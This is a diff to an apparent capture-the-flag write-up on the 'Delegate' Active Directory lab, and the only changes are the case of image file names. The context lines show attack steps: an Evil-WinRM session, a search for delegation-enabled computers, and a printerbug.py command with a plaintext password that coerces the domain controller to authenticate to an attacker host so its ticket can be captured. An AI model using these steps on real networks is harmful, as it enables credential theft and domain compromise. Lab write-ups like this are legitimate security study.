@@ -282,7 +282,7 @@ RustHound-CE Enumeration Completed at 13:11:13 on 05/25/26! Happy Graphing!
 
 Now I uploaded the `.json` files onto `BloodHound`. Let's see if there is anything interesting.
 
-![BloodHound data showing A.Briggs with GenericWrite over N.Thompson](/images/delegate/bh_data.png)
+![BloodHound data showing A.Briggs with GenericWrite over N.Thompson](/images/delegate/BH_Data.png)
 
 `A.Briggs` has `GenericWrite` over the user `N.Thompson`. If we can gain access to this user we can Remote into the machine.
 
@@ -446,7 +446,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set
 
 `N.Thompson` is also part of the group Delegation Admin.
 
-![BloodHound showing N.Thompson's group membership and privileges](/images/delegate/n.thompsonbhdata.png)
+![BloodHound showing N.Thompson's group membership and privileges](/images/delegate/N.ThompsonBHData.png)
 
 ```shell
 *Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Filter {TrustedForDelegation -eq $True}
@@ -559,7 +559,7 @@ Exploit
 └─❯ python3 printerbug.py delegate.vl/n.thompson:KALEB_2341@dc1.delegate.vl evil.delegate.vl
 ```
 
-![krbrelayx capturing the DC's TGT via the printer bug](/images/delegate/exploit.png)
+![krbrelayx capturing the DC's TGT via the printer bug](/images/delegate/Exploit.png)
 
 SecretsDump
 
